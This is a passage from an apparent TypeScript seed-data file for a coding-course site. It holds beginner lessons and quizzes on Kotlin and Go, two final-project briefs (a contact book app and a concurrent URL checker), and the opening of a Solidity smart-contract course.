Java share the same bytecode target, you can mix \`.kt\` and \`.java\` files in one project and call between them freely, one of the biggest reasons Kotlin caught on so fast: teams could adopt it file by file instead of rewriting everything at once.`
    ),
    quiz: {
      title: 'Hello, Kotlin Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which company created Kotlin?',
          options: ['Google', 'JetBrains', 'Oracle', 'Microsoft'],
          answer: 'JetBrains',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In Kotlin, main() must be defined inside a class, like in Java.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The Kotlin compiler command used to compile a .kt file is ____.',
          options: [],
          answer: 'kotlinc',
        },
      ],
    },
  },
  {
    title: 'Variables, Null Safety, and String Templates',
    content: lessonContent(
      'Variables, Null Safety, and String Templates',
      `## val vs. var\n\n\`\`\`kotlin\nval name = "Ada"   // read-only, cannot be reassigned\nvar xp = 0           // mutable, can be reassigned\nxp += 10\n\`\`\`\n\n\`val\` is Kotlin's default mindset: prefer values that never change once assigned, reach for \`var\` only when you genuinely need to reassign. Both still support full type inference, or an explicit type when you want one: \`val price: Double = 9.99\`.\n\n## Null safety\n\nKotlin's type system separates types that can hold \`null\` from types that can't, **at compile time**, which eliminates most \`NullPointerException\`s before the code ever runs.\n\n\`\`\`kotlin\nvar username: String = "ada"    // can never be null\nvar nickname: String? = null      // the ? makes it explicitly nullable\n\nusername = null // compile error, not allowed!\n\`\`\`\n\nTo work with a nullable value, Kotlin gives you two key operators:\n\n\`\`\`kotlin\n// Safe call: returns null instead of crashing if nickname is null\nprintln(nickname?.length)\n\n// Elvis operator: provide a fallback when the left side is null\nval length = nickname?.length ?: 0\n\`\`\`\n\n\`nickname?.length\` reads as "if \`nickname\` isn't null, get its \`length\`, otherwise the whole expression is \`null\`", and \`?: 0\` reads as "...or \`0\` if that was null."\n\n## String templates\n\n\`\`\`kotlin\nval xp = 50\nprintln("Hello, $name! You have $xp XP.")\nprintln("Next level in \${100 - xp} XP.")\n\`\`\`\n\n\`$name\` substitutes a variable directly, \`\${...}\` is needed for full expressions, both are far more readable than Java's \`+\`-based string concatenation.\n\n| | val | var |\n|---|---|---|\n| Reassignable | No | Yes |\n| Mindset | Default choice | Only when needed |\n| Java equivalent | final local variable | regular variable |`
    ),
    quiz: {
      title: 'Null Safety Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the ?. safe call operator do when the value on its left is null?',
          options: [
            'Throws a NullPointerException immediately',
            'Returns null instead of crashing',
            'Silently converts null to an empty string',
            'It is a syntax error, ?. cannot be used on null',
          ],
          answer: 'Returns null instead of crashing',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A variable of type String? can hold null, while a variable of type String cannot.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword for a read-only variable that cannot be reassigned after its first value is ____.',
          options: [],
          answer: 'val',
        },
      ],
    },
  },
  {
    title: 'Control Flow: if, when, and Ranges',
    content: lessonContent(
      'Control Flow: if, when, and Ranges',
      `## if as an expression\n\nIn Kotlin, \`if\` can directly produce a value, no separate ternary operator needed:\n\n\`\`\`kotlin\nval xp = 45\nval message = if (xp >= 50) "Level up!" else "Keep going"\n\`\`\`\n\n## when\n\n\`when\` is Kotlin's replacement for \`switch\`, and it's far more flexible, it can match exact values, ranges, types, or arbitrary conditions:\n\n\`\`\`kotlin\nval tier = when {\n    xp >= 100 -> "Platinum"\n    xp >= 50 -> "Gold"\n    xp >= 25 -> "Silver"\n    else -> "Bronze"\n}\n\nval dayName = when (3) {\n    1, 7 -> "Weekend"\n    in 2..6 -> "Weekday"\n    else -> "Invalid"\n}\n\`\`\`\n\nEach branch uses \`->\`, and \`when\` doesn't fall through to the next branch the way older \`switch\` statements in other languages can, only the first matching branch runs.\n\n## Ranges and loops\n\n\`\`\`kotlin\nfor (i in 1..5) {\n    println("Iteration $i")\n}\n\nfor (i in 10 downTo 1 step 2) {\n    println(i) // 10, 8, 6, 4, 2\n}\n\nval scores = listOf(90, 85, 77)\nfor (score in scores) {\n    println(score)\n}\n\nvar tries = 0\nwhile (tries < 3) {\n    tries++\n}\n\`\`\`\n\n\`1..5\` creates a **range**, an inclusive sequence of values, \`downTo\` counts backward, and \`step\` changes the increment. \`for (score in scores)\` reads as "for each \`score\` in \`scores\`", the idiomatic way to iterate a collection.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is 1..5 called in Kotlin?',
          options: ['A list', 'A range', 'A tuple', 'An array literal'],
          answer: 'A range',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In Kotlin, if can be used as an expression that produces a value, e.g. val x = if (cond) a else b.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "Kotlin's more flexible replacement for a traditional switch statement is the ____ expression.",
          options: [],
          answer: 'when',
        },
      ],
    },
  },
  {
    title: 'Functions and Lambdas',
    content: lessonContent(
      'Functions and Lambdas',
      `## Declaring functions\n\n\`\`\`kotlin\nfun greet(name: String, greeting: String = "Hello"): String {\n    return "$greeting, $name!"\n}\n\ngreet("Ada")                         // "Hello, Ada!" (uses the default)\ngreet("Ada", "Welcome")              // "Welcome, Ada!" (positional)\ngreet(name = "Ada", greeting = "Hi") // "Hi, Ada!" (named, order doesn't matter)\n\`\`\`\n\n\`greeting: String = "Hello"\` is a **default argument**, callers can skip it entirely. **Named arguments** let you pass values by parameter name, useful when a function takes several similarly-typed parameters and you want the call site to stay readable.\n\n## Single-expression functions\n\nWhen a function's body is just one expression, you can skip \`return\` and the braces entirely:\n\n\`\`\`kotlin\nfun square(x: Int) = x * x\n\`\`\`\n\n## Lambdas and higher-order functions\n\nA **lambda** is a function value, one you can store in a variable or pass as an argument:\n\n\`\`\`kotlin\nval double: (Int) -> Int = { x -> x * 2 }\nprintln(double(5)) // 10\n\`\`\`\n\nA function that accepts another function as a parameter is a **higher-order function**:\n\n\`\`\`kotlin\nfun applyTwice(x: Int, op: (Int) -> Int): Int = op(op(x))\n\nprintln(applyTwice(3) { it + 1 }) // 5\n\`\`\`\n\nTwo things happening in that last line:\n\n- When a lambda is the **last** parameter, it can be written outside the parentheses, this is called **trailing lambda syntax**, and it's everywhere in idiomatic Kotlin.\n- Inside a single-parameter lambda, \`it\` is the implicit name for that parameter, so \`{ it + 1 }\` means "take the one argument and add 1", no need to write \`{ x -> x + 1 }\` when there's nothing ambiguous about it.`
    ),
    quiz: {
      title: 'Functions and Lambdas Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Inside a single-parameter lambda, what is the implicit name for that parameter if you don\'t name it yourself?',
          options: ['self', 'it', 'this', 'arg'],
          answer: 'it',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Named arguments let you pass arguments in a different order than the function declares them.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A function like "fun square(x: Int) = x * x" that skips return and braces is called a ____-expression function.',
          options: [],
          answer: 'single',
        },
      ],
    },
  },
  {
    title: 'Classes, Data Classes, and Objects',
    content: lessonContent(
      'Classes, Data Classes, and Objects',
      `## Classes with a primary constructor\n\n\`\`\`kotlin\nclass Student(val name: String, var xp: Int = 0) {\n    fun gainXp(amount: Int) {\n        xp += amount\n    }\n}\n\nval ada = Student("Ada")\nada.gainXp(50)\nprintln(ada.xp) // 50\n\`\`\`\n\nDeclaring \`val name: String\` directly inside the class header does three things at once: declares a constructor parameter, creates a property, **and** generates its getter (and a setter too, for \`var\` properties), all without writing a single line of boilerplate. Compare that to Java's \`Methods and Classes\` lesson, where the constructor, field, and getter each had to be written out by hand.\n\n## Data classes\n\nWhen a class exists mainly to hold data, \`data class\` generates \`equals()\`, \`hashCode()\`, \`toString()\`, and a handy \`copy()\` for you:\n\n\`\`\`kotlin\ndata class Point(val x: Int, val y: Int)\n\nval p1 = Point(1, 2)\nval p2 = Point(1, 2)\n\nprintln(p1 == p2)        // true, structural equality, not reference equality\nprintln(p1)                // Point(x=1, y=2)\nval p3 = p1.copy(y = 5)  // Point(x=1, y=5), everything else copied as-is\n\`\`\`\n\n\`p1 == p2\` is \`true\` even though they're two separate objects, because \`data class\` compares by **value**, not by memory reference, exactly what you want for simple data-holding types.\n\n## object and companion object\n\n\`object\` declares a class with exactly one instance, a **singleton**, created lazily the first time it's used:\n\n\`\`\`kotlin\nobject Config {\n    val maxRetries = 3\n}\n\nprintln(Config.maxRetries)\n\`\`\`\n\nA \`companion object\` attaches shared, class-level members to a regular class, similar to \`static\` in Java:\n\n\`\`\`kotlin\nclass User(val id: Int) {\n    companion object {\n        fun createGuest() = User(0)\n    }\n}\n\nval guest = User.createGuest()\n\`\`\``
    ),
    quiz: {
      title: 'Classes & Data Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does declaring "class Student(val name: String)" generate automatically that Java requires writing by hand?',
          options: [
            'Nothing, it works exactly like Java',
            'A property with an auto-generated getter, no manual field or getter needed',
            'A public field only, with no getter',
            'A static field',
          ],
          answer: 'A property with an auto-generated getter, no manual field or getter needed',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two data class instances with identical property values are == to each other, because data classes get structural equality.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to declare a class with exactly one, lazily-created instance (a singleton) is ____.',
          options: [],
          answer: 'object',
        },
      ],
    },
  },
  {
    title: 'Collections and Extension Functions',
    content: lessonContent(
      'Collections and Extension Functions',
      `## Read-only vs. mutable collections\n\nKotlin applies the same val/var philosophy to collections: prefer read-only by default.\n\n\`\`\`kotlin\nval languages = listOf("Kotlin", "Java", "Go")        // read-only List\nval mutableLanguages = mutableListOf("Kotlin")          // MutableList\nmutableLanguages.add("Java")\n\`\`\`\n\n\`listOf(...)\` returns a \`List\` with no \`.add()\`/\`.remove()\` at all, not just a convention, the compiler enforces it. Reach for \`mutableListOf(...)\` only when you genuinely need to change the collection after creating it.\n\n## Functional operations\n\n\`\`\`kotlin\nval upper = languages.map { it.uppercase() }        // ["KOTLIN", "JAVA", "GO"]\nval short = languages.filter { it.length <= 4 }      // ["Java", "Go"]\nval total = listOf(1, 2, 3).reduce { acc, n -> acc + n } // 6\n\`\`\`\n\n\`map\` transforms every element into something new, \`filter\` keeps only the elements matching a condition, and \`reduce\` combines every element into a single result by repeatedly applying a function to an accumulator (\`acc\`) and the next element.\n\n## Extension functions\n\nAn **extension function** adds a new function to an existing type, even one you don't own the source code for, without subclassing or modifying it:\n\n\`\`\`kotlin\nfun String.shout(): String = this.uppercase() + "!"\n\nprintln("hello".shout()) // "HELLO!"\n\`\`\`\n\n\`String.shout()\` reads as "an extension function on \`String\`", inside its body, \`this\` refers to the specific \`String\` it was called on ("hello" here). Kotlin's own standard library, including \`map\`, \`filter\`, and \`reduce\` above, is itself built almost entirely out of extension functions on the built-in collection types.\n\n> [!TIP]\n> Extension functions are resolved at compile time based on the declared type, not real "monkey-patching", they're a safe, readable way to add convenience methods without touching the original class.`
    ),
    quiz: {
      title: 'Collections & Extensions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the key difference between listOf() and mutableListOf()?',
          options: [
            'listOf() is faster but otherwise identical',
            'listOf() creates a read-only List, mutableListOf() creates a List you can add/remove from',
            'mutableListOf() can only hold numbers',
            'There is no difference, both are mutable',
          ],
          answer: 'listOf() creates a read-only List, mutableListOf() creates a List you can add/remove from',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An extension function can be called on a type without modifying that type\'s original source code.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The higher-order function that transforms each element of a collection into a new value is called ____.',
          options: [],
          answer: 'map',
        },
      ],
    },
  },
  {
    title: 'Final Project: Contact Book Console App',
    content: lessonContent(
      'Final Project: Contact Book Console App',
      `Combine everything from this course, null safety, data classes, \`when\`, and extension functions, into a small, real console application: a contact book.\n\n## Requirements\n\n1. Create a \`data class Contact(val name: String, val phone: String, var favorite: Boolean = false)\`.\n2. Create a \`ContactBook\` class holding a \`MutableList<Contact>\`, with methods \`addContact(c: Contact)\`, \`findContact(name: String): Contact?\` (returns \`null\` if not found, don't throw), \`removeContact(name: String)\`, and \`listFavorites(): List<Contact>\`.\n3. In \`main\`, add at least 3 contacts, mark one as a favorite, then call \`findContact\` with a name that doesn't exist and handle the \`null\` result gracefully (using \`?.\` and/or \`?:\`) instead of crashing.\n4. Print all favorite contacts.\n5. Write at least one extension function, e.g. \`fun Contact.displayName() = "$name ($phone)"\`, and use it when printing contacts.\n\n## Stretch goals\n\n- Use a \`when\` expression to group contacts by the first letter of their name.\n- Make lookups in \`findContact\` case-insensitive.\n- Sort the favorites list alphabetically by name before printing it.\n\nSubmit a link to your finished project below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const goLessons: SeedLesson[] = [
  {
    title: 'Hello, Go',
    content: lessonContent(
      'Hello, Go',
      `Go (often called Golang) was built at Google to be simple, fast to compile, and easy to run at scale, it deliberately has a small feature set compared to languages like C++ or Java, that's a design goal, not a limitation.\n\n## Your first program\n\n\`\`\`go\npackage main\n\nimport "fmt"\n\nfunc main() {\n    fmt.Println("Hello, Kodstigen!")\n}\n\`\`\`\n\n- Every Go file belongs to a **package**, \`package main\` marks this one as an executable program's entry point (as opposed to a reusable library package).\n- \`import "fmt"\` brings in the formatting/printing package, Go's standard library is organized into small, focused packages like this.\n- \`func main()\` is where execution starts, no class wrapper needed, unlike Java.\n\n## Compiling and running\n\n\`\`\`bash\ngo run main.go     # compile and run in one step, good for development\ngo build main.go   # produce a standalone binary called main (or main.exe)\n./main\n\`\`\`\n\nGo compiles to a **single, statically-linked binary** with no external runtime required, you can copy that one file to another machine and run it, nothing else needs to be installed.\n\n> [!TIP]\n> Go ships an opinionated formatter, \`gofmt\`, and the community treats consistent formatting as non-negotiable. Run \`gofmt -w main.go\` and never argue about tabs vs. spaces again.`
    ),
    quiz: {
      title: 'Hello, Go Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does "go build" produce?',
          options: ['A bytecode file requiring a separate runtime', 'A standalone, statically-linked binary', 'A JavaScript file', 'Nothing, it only checks for errors'],
          answer: 'A standalone, statically-linked binary',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Go requires main to be defined inside a class, similar to Java.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command that compiles and runs a Go file in a single step is: go ____ main.go',
          options: [],
          answer: 'run',
        },
      ],
    },
  },
  {
    title: 'Variables, Types and Constants',
    content: lessonContent(
      'Variables, Types and Constants',
      `Go is statically typed, but leans hard on type inference so you rarely have to spell types out.\n\n\`\`\`go\nvar xp int = 0        // explicit type\nvar name = "Ada"       // inferred as string\ncount := 5              // short declaration, inferred, only works inside functions\nxp += 10\n\`\`\`\n\n\`:=\` is the idiomatic way to declare and initialize a variable at the same time inside a function, Go infers the type from the right-hand side. \`var\` is used instead when you need to declare without initializing, or at the package level (outside any function), where \`:=\` isn't allowed.\n\n## Zero values\n\nUnlike many languages, an uninitialized Go variable is never garbage or \`undefined\`, it gets a sensible **zero value** automatically:\n\n\`\`\`go\nvar count int      // 0\nvar name string     // "" (empty string)\nvar ready bool      // false\n\`\`\`\n\nThis eliminates an entire category of "uninitialized variable" bugs common in other languages.\n\n## Constants\n\n\`\`\`go\nconst MaxRetries = 3\nconst Pi = 3.14159\n\`\`\`\n\n\`const\` values are fixed at compile time and can never be reassigned, use them for values that should never change during a program's execution, like configuration limits.`
    ),
    quiz: {
      title: 'Variables and Constants Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the zero value of an uninitialized Go int?',
          options: ['null', 'undefined', '0', 'It is a compile error'],
          answer: '0',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The := short declaration operator can be used at the package level, outside any function.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A value declared with ____ is fixed at compile time and can never be reassigned.',
          options: [],
          answer: 'const',
        },
      ],
    },
  },
  {
    title: 'Control Flow',
    content: lessonContent(
      'Control Flow',
      `Go strips control flow down to the essentials, there's no \`while\`, no ternary operator, and \`if\` never needs parentheses around its condition.\n\n\`\`\`go\nxp := 45\n\nif xp >= 100 {\n    fmt.Println("Level up!")\n} else if xp >= 50 {\n    fmt.Println("Almost there")\n} else {\n    fmt.Println("Keep going")\n}\n\`\`\`\n\n## for is Go's only loop\n\nGo has exactly one looping keyword, \`for\`, used in several shapes:\n\n\`\`\`go\nfor i := 0; i < 5; i++ {   // classic three-part form\n    fmt.Println(i)\n}\n\ncount := 0\nfor count < 3 {              // this IS Go's while loop\n    count++\n}\n\nfor {                         // infinite loop, until an explicit break\n    break\n}\n\nscores := []int{90, 85, 77}\nfor i, score := range scores { // like Python's enumerate\n    fmt.Println(i, score)\n}\n\`\`\`\n\n\`range\` gives you both the index and value on each iteration, if you only need the value, discard the index with \`_\`: \`for _, score := range scores\`.\n\n## switch\n\n\`\`\`go\nswitch {\ncase xp >= 100:\n    fmt.Println("Gold")\ncase xp >= 50:\n    fmt.Println("Silver")\ndefault:\n    fmt.Println("Bronze")\n}\n\`\`\`\n\nUnlike C or Java, a Go \`switch\` case does **not** fall through to the next one automatically, each case breaks on its own by default, removing a very common source of bugs.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which keyword is used for every kind of loop in Go, including a "while"-style loop?',
          options: ['while', 'loop', 'for', 'repeat'],
          answer: 'for',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A Go switch case automatically falls through to the next case unless you add a break.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Iterating with "for i, v := range items" gives you both the index and the ____ on each pass.',
          options: [],
          answer: 'value',
        },
      ],
    },
  },
  {
    title: 'Functions and Multiple Return Values',
    content: lessonContent(
      'Functions and Multiple Return Values',
      `Go functions are straightforward, with one distinctive feature that shapes idiomatic Go code more than almost anything else: they can return **multiple values**.\n\n\`\`\`go\nfunc add(a int, b int) int {\n    return a + b\n}\n\nfunc divide(a, b float64) (float64, error) {\n    if b == 0 {\n        return 0, fmt.Errorf("cannot divide %v by zero", a)\n    }\n    return a / b, nil\n}\n\`\`\`\n\n\`\`\`go\nresult, err := divide(10, 0)\nif err != nil {\n    fmt.Println("Error:", err)\n} else {\n    fmt.Println("Result:", result)\n}\n\`\`\`\n\n## Why Go does errors this way\n\nGo deliberately has **no exceptions** for ordinary error handling. Instead, any function that can fail returns an \`error\` as its last value, \`nil\` means success. The caller checks \`if err != nil\` immediately after every call that could fail, this is more verbose than a \`try\`/\`catch\`, but it makes every possible failure point visible directly in the code, nothing can silently fail three function calls away.\n\n## Named returns\n\n\`\`\`go\nfunc minMax(nums []int) (min, max int) {\n    min, max = nums[0], nums[0]\n    for _, n := range nums {\n        if n < min { min = n }\n        if n > max { max = n }\n    }\n    return // "naked" return, sends back the current values of min and max\n}\n\`\`\`\n\nNaming return values documents intent directly in the function signature, and lets a bare \`return\` send back whatever they currently hold.`
    ),
    quiz: {
      title: 'Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How does idiomatic Go typically signal that a function call failed?',
          options: ['Throwing an exception', 'Returning a non-nil error as the last return value', 'Returning -1', 'Crashing the program immediately'],
          answer: 'Returning a non-nil error as the last return value',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A nil error return value conventionally means the function call succeeded.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A Go function can return more than one value at once, commonly a result and an ____.',
          options: [],
          answer: 'error',
        },
      ],
    },
  },
  {
    title: 'Structs and Methods',
    content: lessonContent(
      'Structs and Methods',
      `Go has no classes, but combines **structs** with **methods** (functions attached to a type) to get most of the same benefits, more explicitly.\n\n\`\`\`go\ntype Student struct {\n    Name string\n    XP   int\n}\n\nfunc (s *Student) GainXP(amount int) {\n    s.XP += amount\n}\n\nfunc (s Student) Greeting() string {\n    return "Hi, I'm " + s.Name\n}\n\`\`\`\n\n\`\`\`go\nada := Student{Name: "Ada", XP: 0}\nada.GainXP(50)\nfmt.Println(ada.XP)         // 50\nfmt.Println(ada.Greeting()) // "Hi, I'm Ada"\n\`\`\`\n\n\`func (s *Student) GainXP(...)\` is a **method** with \`s\` as its **receiver**, this is what attaches the function to the \`Student\` type, letting you call it as \`ada.GainXP(...)\` instead of \`GainXP(ada, ...)\`.\n\n## Pointer vs. value receivers\n\nThis is the one detail that trips everyone up at first: \`GainXP\` uses a **pointer** receiver (\`*Student\`) because it needs to *modify* the struct, \`Greeting\` uses a **value** receiver (\`Student\`) because it only *reads* from it. A value receiver operates on a copy, changes inside it never affect the original:\n\n\`\`\`go\nfunc (s Student) BrokenGainXP(amount int) {\n    s.XP += amount // only modifies the local copy, caller sees no change\n}\n\`\`\`\n\nRule of thumb: if a method needs to modify the struct, use a pointer receiver, if it only reads, either works, but staying consistent within a type is idiomatic Go.`
    ),
    quiz: {
      title: 'Structs and Methods Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does GainXP use a pointer receiver (*Student) instead of a value receiver?',
          options: ['Pointer receivers are always faster', 'It needs to modify the original struct, not a copy', 'Value receivers are illegal in Go', 'It is required for every method'],
          answer: 'It needs to modify the original struct, not a copy',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A method with a value receiver operates on a copy of the struct, so changes inside it are not visible to the caller.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In "func (s *Student) GainXP(...)", s is called the method\'s ____.',
          options: [],
          answer: 'receiver',
        },
      ],
    },
  },
  {
    title: 'Slices, Maps and Error Handling',
    content: lessonContent(
      'Slices, Maps and Error Handling',
      `Go's two everyday collection types, and a closer look at the error-handling pattern you've already seen in action.\n\n## Slices\n\nA slice is a resizable, dynamically-sized view over an underlying array, Go's equivalent of a list:\n\n\`\`\`go\nscores := []int{90, 85, 77}\nscores = append(scores, 100)    // append returns a new slice, always reassign it\nfmt.Println(scores[0])           // 90\nfmt.Println(len(scores))          // 4\n\nsubset := scores[1:3]              // elements at index 1 and 2\n\`\`\`\n\n\`append\` might allocate a new underlying array behind the scenes if the old one ran out of room, that's exactly why you always write \`scores = append(scores, ...)\` instead of just calling it and discarding the result.\n\n## Maps\n\n\`\`\`go\nscoresByName := map[string]int{"Ada": 95, "Grace": 98}\nscoresByName["Bob"] = 70\n\nvalue, ok := scoresByName["Missing"]\nfmt.Println(value, ok)     // 0 false, ok tells you whether the key existed\n\ndelete(scoresByName, "Bob")\n\`\`\`\n\nThe **comma-ok idiom** (\`value, ok := ...\`) is how Go distinguishes "the key exists and its value is the zero value" from "the key doesn't exist at all", both would otherwise look identical.\n\n## Error handling recap\n\n\`\`\`go\nfile, err := os.Open("data.txt")\nif err != nil {\n    fmt.Println("Could not open file:", err)\n    return\n}\ndefer file.Close()   // runs when the surrounding function returns, guaranteed\n\`\`\`\n\n\`defer\` schedules a call to run right before the enclosing function returns, no matter which \`return\` statement triggers it, exactly like a \`finally\` block, and the idiomatic way to guarantee cleanup (closing files, unlocking mutexes) happens.`
    ),
    quiz: {
      title: 'Slices, Maps and Error Handling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the second value in "value, ok := myMap[key]" tell you?',
          options: ['The type of the key', 'Whether the key exists in the map', 'The length of the map', 'Whether the map is nil'],
          answer: 'Whether the key exists in the map',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'defer schedules a function call to run right before the enclosing function returns.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The built-in function used to add an element to a slice is: ____(scores, newValue)',
          options: [],
          answer: 'append',
        },
      ],
    },
  },
  {
    title: 'Goroutines and Channels',
    content: lessonContent(
      'Goroutines and Channels',
      `Concurrency is Go's headline feature. A **goroutine** is a lightweight, independently-running function, and a **channel** is a typed pipe for goroutines to safely communicate through, instead of sharing memory directly.\n\n## Goroutines\n\n\`\`\`go\nfunc sayHi(name string) {\n    fmt.Println("Hi,", name)\n}\n\nfunc main() {\n    go sayHi("Ada")    // runs concurrently, doesn't block main\n    go sayHi("Grace")\n    time.Sleep(100 * time.Millisecond) // crude wait, channels below do this properly\n}\n\`\`\`\n\nThe \`go\` keyword launches a function as a goroutine, thousands of them can run concurrently with very little overhead, far lighter-weight than an OS thread.\n\n## Channels\n\nWithout coordination, \`main\` might exit before the goroutines above even run. Channels solve this properly:\n\n\`\`\`go\nfunc fetchStatus(url string, results chan<- string) {\n    // pretend this makes a real HTTP request\n    results <- url + ": OK"   // send a value into the channel\n}\n\nfunc main() {\n    urls := []string{"a.com", "b.com", "c.com"}\n    results := make(chan string)\n\n    for _, url := range urls {\n        go fetchStatus(url, results)\n    }\n\n    for range urls {\n        fmt.Println(<-results)   // receive a value, blocks until one arrives\n    }\n}\n\`\`\`\n\n\`results <- value\` sends into the channel, \`<-results\` receives from it, and receiving **blocks** until a value is available, this is exactly what replaces \`time.Sleep\` guesswork with real synchronization: \`main\` waits precisely as long as it needs to, no more, no less.\n\n> [!TIP]\n> Go's own proverb sums up the philosophy: "Don't communicate by sharing memory, share memory by communicating." Channels are the idiomatic way to coordinate goroutines, reaching for shared variables and locks is usually a sign to reach for a channel instead.`
    ),
    quiz: {
      title: 'Goroutines and Channels Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the "go" keyword do when placed before a function call?',
          options: ['Deletes the function', 'Runs the function as a lightweight, concurrent goroutine', 'Compiles the function ahead of time', 'Imports the function from another package'],
          answer: 'Runs the function as a lightweight, concurrent goroutine',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Receiving from a channel with <-results blocks until a value is available.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A typed pipe used for goroutines to safely send and receive values is called a ____.',
          options: [],
          answer: 'channel',
        },
      ],
    },
  },
  {
    title: 'Final Project: Concurrent URL Status Checker',
    content: lessonContent(
      'Final Project: Concurrent URL Status Checker',
      `Combine goroutines, channels, structs, and error handling into a small concurrent tool: a URL status checker that checks multiple URLs at once instead of one at a time.\n\n## Requirements\n\n1. Define a \`Result\` struct with fields for the URL, its HTTP status code (or an error), and how long the request took.\n2. Write a \`checkURL(url string, results chan<- Result)\` function using \`net/http\`'s \`http.Get\`, sending a \`Result\` into the channel when done (success or failure).\n3. In \`main\`, launch a goroutine per URL for a list of at least 5 URLs, then receive and print every result as it arrives.\n4. Handle the error case explicitly, a failed request should still produce a \`Result\` (with the error recorded), not crash the whole program.\n5. Print a final summary: how many succeeded, how many failed, and the total time the whole batch took (it should be close to the *slowest single request*, not the sum of all of them, that's the entire point of doing this concurrently).\n\n## Stretch goals\n\n- Add a timeout per request using \`context.WithTimeout\`.\n- Limit how many requests run at once (a worker pool) instead of launching unlimited goroutines.\n- Sort the final results by response time before printing.\n\nSubmit a link to your finished project below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const solidityLessons: SeedLesson[] = [
  {
    title: 'Introduction to Smart Contracts & Solidity',
    content: lessonContent(
      'Introduction to Smart Contracts & Solidity',
      `A **smart contract** is a program that lives on a blockchain, deployed once, then executed automatically and identically by every node in the network, no company or server can be shut down or quietly change its behavior. **Solidity** is the language most Ethereum smart contracts are written in.\n\n## Your first contract\n\n\`\`\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract Greeter {\n    string public greeting = "Hello, Kodstigen!";\n\n    function setGreeting(string memory newGreeting) public {\n        greeting = newGreeting;\n    }\n}\n\`\`\`\n\n- \`pragma solidity ^0.8.20;\` pins which compiler version this contract expects, the \`^\` allows any compatible 0.8.x version, protecting against breaking changes in future major versions.\n- \`contract Greeter { ... }\` is the closest thing Solidity has to a class, it bundles state and functions together, like a Java or C# class deployed permanently to the blockchain.\n- \`string public greeting\` is a **state variable**, permanently stored on the blockchain itself, \`public\` automatically generates a free getter function for it.\n\n## The EVM\n\nSolidity compiles to bytecode that runs on the **EVM** (Ethereum Virtual Machine), conceptually similar to how Java compiles to bytecode for the JVM, except every EVM node in the world executes the same bytecode and must reach the exact same result, that's what makes it trustworthy without a central authority.\n\n> [!WARNING]\n> Once deployed, a smart contract's code **cannot be changed**. There's no patching a bug in production the way you'd redeploy a web server, this is exactly why security and careful testing matter so much more here than in most other kinds of programming.`
    ),
    quiz: {
      title: 'Smart Contracts Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the EVM do?',
          options: ['Stores files for a website', 'Executes smart contract bytecode identically across every network node', 'Compiles Java to bytecode', 'Mines new Bitcoin'],
          answer: 'Executes smart contract bytecode identically across every network node',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A deployed smart contract\'s code can be edited later the same way you would redeploy a web server.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
